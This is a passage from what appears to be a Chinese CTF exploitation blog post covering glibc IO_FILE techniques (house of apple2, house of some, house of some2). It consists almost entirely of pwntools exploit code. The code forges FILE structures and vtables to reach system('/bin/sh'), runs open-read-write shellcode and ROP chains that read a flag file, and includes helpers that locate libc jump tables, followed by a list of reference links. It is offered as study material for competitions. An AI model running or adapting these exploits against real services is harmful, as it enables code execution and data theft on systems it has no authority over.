<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">    <span class="number">0x8</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x28</span>: libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xa0</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x40</span>,</span><br><span class="line">    <span class="number">0xd8</span>: libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] - <span class="number">0x20</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)  </span><br></pre></td></tr></table></figure>
<p>然后是用于打<code>orw</code>的<code>house of apple2</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x8</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x10</span>: setcontext,</span><br><span class="line">    <span class="number">0x20</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x28</span>: pcop,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x58</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] &amp; (~<span class="number">0xfff</span>),    <span class="comment"># set rdi</span></span><br><span class="line">    <span class="number">0x60</span>: <span class="number">0x1000</span>,               <span class="comment"># set rsi</span></span><br><span class="line">    <span class="number">0x78</span>: <span class="number">7</span>,                    <span class="comment"># set rdx</span></span><br><span class="line">    <span class="number">0x90</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0xf0</span>,          <span class="comment"># set rsp</span></span><br><span class="line">    <span class="number">0x98</span>: libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>],             <span class="comment"># set rcx (first jmp)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xa0</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x40</span>,</span><br><span class="line">    <span class="number">0xd8</span>: libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] - <span class="number">0x20</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0xe8</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>],</span><br><span class="line"></span><br><span class="line">    <span class="number">0xf0</span>: [                     <span class="comment"># ROPstart</span></span><br><span class="line">        pop_rax_call_rax,</span><br><span class="line">        libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0x100</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x100</span>: asm(    <span class="comment"># shellcode start</span></span><br><span class="line"><span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall     </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="house-of-some改进版"><a href="#house-of-some改进版" class="headerlink" title="house of some改进版"></a>house of some改进版</h3><p>这里就贴某次比赛的<code>exp</code>，优点是可以不泄露堆地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,fake_io_read)</span><br><span class="line">bye()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;conversation&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">target = stack - <span class="number">648</span></span><br><span class="line">log.success(<span class="string">f&#x27;target:<span class="subst">&#123;target:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x000000000015f8c6</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000036174</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x00000000000630a9</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, target + <span class="number">0xc0</span>,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>,</span><br><span class="line">    pop_rsi_ret, target + <span class="number">0x150</span>,</span><br><span class="line">    pop_rdx_rbx_ret, <span class="number">0x30</span>,<span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line">    <span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<h3 id="house-of-some2"><a href="#house-of-some2" class="headerlink" title="house of some2"></a>house of some2</h3><p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csome.cc/p/house-of-some-2/">https://blog.csome.cc/p/house-of-some-2/</a> 只能说非常的暴力</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_IO_wfile_jumps_maybe_mmap</span>():</span><br><span class="line">    <span class="keyword">global</span> libc,libc_base</span><br><span class="line">    a = <span class="built_in">list</span>(libc.search(p64(libc.symbols[<span class="string">&#x27;_IO_wfile_overflow&#x27;</span>])))</span><br><span class="line">    b = <span class="built_in">list</span>(libc.search(p64(libc.symbols[<span class="string">&#x27;_IO_file_close&#x27;</span>])))</span><br><span class="line">    ans = []</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> b:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(i - j) == <span class="number">0x70</span> <span class="keyword">and</span> i - <span class="number">24</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:</span><br><span class="line">                ans.append(i - <span class="number">24</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(x + libc_base), ans))&#125;</span> may be the address of _IO_wfile_jumps_maybe_mmap&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (u64(libc.read(ans[<span class="number">0</span>] + <span class="number">0x20</span>,<span class="number">0x8</span>)) + libc_base) == (libc.symbols[<span class="string">&#x27;_IO_wfile_underflow&#x27;</span>] + libc_base):</span><br><span class="line">        result = ans[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = ans[<span class="number">0</span>]</span><br><span class="line">    log.success(<span class="string">f&#x27;_IO_wfile_jumps_maybe_mmap:<span class="subst">&#123;result+libc_base:#x&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result + libc_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_IO_file_jumps</span>():</span><br><span class="line">    <span class="keyword">global</span> libc,libc_base</span><br><span class="line">    IO_file_jumps = libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">    IO_str_underflow = libc.symbols[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">    IO_str_underflow_ptr = <span class="built_in">list</span>(libc.search(p64(IO_str_underflow)))</span><br><span class="line">    IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + <span class="number">0x20</span>)] - <span class="number">0x20</span> + libc_base</span><br><span class="line">    log.success(<span class="string">f&#x27;IO_str_jumps:<span class="subst">&#123;IO_str_jumps:#x&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> IO_str_jumps</span><br><span class="line"></span><br><span class="line">IO_str_jumps = search_IO_file_jumps()</span><br><span class="line">_IO_default_xsgetn = IO_str_jumps + <span class="number">0x40</span></span><br><span class="line">_IO_default_xsputn = IO_str_jumps + <span class="number">0x38</span></span><br><span class="line">_IO_wfile_jumps_maybe_mmap=search_IO_wfile_jumps_maybe_mmap()</span><br><span class="line"></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span>, <span class="comment"># disable lock</span></span><br><span class="line">    <span class="number">0x38</span>: libc_base + libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>], <span class="comment"># _IO_buf_base</span></span><br><span class="line">    <span class="number">0x40</span>: libc_base + libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xa0</span>: libc_base + libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x100</span>, <span class="comment"># +0xe0可写即可</span></span><br><span class="line">    <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>), <span class="comment"># _mode &lt; 0</span></span><br><span class="line">    <span class="number">0xd8</span>: _IO_wfile_jumps_maybe_mmap - <span class="number">0x18</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x408</span>,fake_file+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(flat(&#123;</span><br><span class="line">    <span class="number">0x8</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>],</span><br><span class="line">    <span class="number">0x38</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span> + <span class="number">0xc8</span>, <span class="comment"># _IO_buf_base</span></span><br><span class="line">    <span class="number">0x40</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">    <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0xe0</span>,   </span><br><span class="line">    <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>),</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xd8</span>: _IO_default_xsputn - <span class="number">0x90</span>, <span class="comment"># vtable</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    <span class="number">0x30</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>], <span class="comment"># _IO_write_end</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0xe0</span>: _IO_wfile_jumps_maybe_mmap </span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.send(flat(&#123;</span><br><span class="line">    <span class="number">0</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>], <span class="comment"># retn</span></span><br><span class="line">    <span class="number">0x8</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x1c8</span>-<span class="number">0xc8</span>: &#123;</span><br><span class="line">        <span class="comment"># 0x0: p32(0xffffffff),</span></span><br><span class="line">        <span class="number">0x0</span>:<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">        <span class="number">0x38</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span> + <span class="number">0xc8</span>, <span class="comment"># _IO_buf_base</span></span><br><span class="line">        <span class="number">0x40</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">        <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0xe0</span>,   </span><br><span class="line">        <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>),</span><br><span class="line"></span><br><span class="line">        <span class="number">0xd8</span>: _IO_default_xsgetn - <span class="number">0x90</span>, <span class="comment"># vtable</span></span><br><span class="line">        <span class="number">0x08</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span>, <span class="comment"># _IO_read_ptr</span></span><br><span class="line">        <span class="number">0x10</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + (<span class="number">0x1c8</span> - <span class="number">0xc8</span>), <span class="comment"># _IO_read_end</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0xe0</span>: &#123;</span><br><span class="line">            <span class="number">0xe0</span>: _IO_wfile_jumps_maybe_mmap</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sta8r9/p/17586219.html">https://www.cnblogs.com/Sta8r9/p/17586219.html</a>(house of cat)<br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6">https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6</a>(House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解)<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235598">https://www.anquanke.com/post/id/235598</a>(House OF Kiwi)<br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>([原创]House of apple 一种新的glibc中IO攻击方法 (2))<br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_13">https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_13</a>([原创] CTF 中 glibc堆利用 及 IO_FILE 总结)<br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-276031.htm(%5B%E5%8E%9F%E5%88%9B%5D%E6%97%A0%E8%B7%AF%E8%BF%9C%E5%BE%81%E2%80%94%E2%80%94GLIBC2.37%E5%90%8E%E6%97%B6%E4%BB%A3%E7%9A%84IO%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93%EF%BC%88%E4%BA%8C%EF%BC%89house_of_%E7%A7%A6%E6%9C%88%E6%B1%89%E5%85%B3)">https://bbs.kanxue.com/thread-276031.htm([原创]无路远征——GLIBC2.37后时代的IO攻击之道（二）house_of_秦月汉关)</a><br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273863.htm#msg_header_h3_0">https://bbs.kanxue.com/thread-273863.htm#msg_header_h3_0</a>([原创]House of apple 一种新的glibc中IO攻击方法 (3))<br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-276056.htm(%5B%E5%8E%9F%E5%88%9B%5D%E6%97%A0%E8%B7%AF%E8%BF%9C%E5%BE%81%E2%80%94%E2%80%94GLIBC2.37%E5%90%8E%E6%97%B6%E4%BB%A3%E7%9A%84IO%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93%EF%BC%88%E4%BA%94%EF%BC%89house_of_%E4%B8%80%E9%AA%91%E5%BD%93%E5%8D%83)">https://bbs.kanxue.com/thread-276056.htm([原创]无路远征——GLIBC2.37后时代的IO攻击之道（五）house_of_一骑当千)</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/friend/">friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E7%BB%93%E6%9E%84%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">部分结构源码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-FILE"><span class="toc-number">1.1.</span> <span class="toc-text">_IO_FILE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-jump-t"><span class="toc-number">1.2.</span> <span class="toc-text">_IO_jump_t</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#struct-IO-wide-data"><span class="toc-number">1.3.</span> <span class="toc-text">struct _IO_wide_data</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-wfile-jumps"><span class="toc-number">1.4.</span> <span class="toc-text">_IO_wfile_jumps</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-printf-buffer-as-file-jumps"><span class="toc-number">1.5.</span> <span class="toc-text">_IO_printf_buffer_as_file_jumps</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-cookie-jumps"><span class="toc-number">1.6.</span> <span class="toc-text">_IO_cookie_jumps</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tcache-Stashing-Unlink-Attack"><span class="toc-number">2.</span> <span class="toc-text">Tcache Stashing Unlink Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poc-how2heap"><span class="toc-number">2.1.</span> <span class="toc-text">poc(how2heap):</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-reverse-into-tcache"><span class="toc-number">3.</span> <span class="toc-text">fastbin reverse into tcache</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poc-how2heap-1"><span class="toc-number">3.1.</span> <span class="toc-text">poc(how2heap):</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#largebin-attack"><span class="toc-number">4.</span> <span 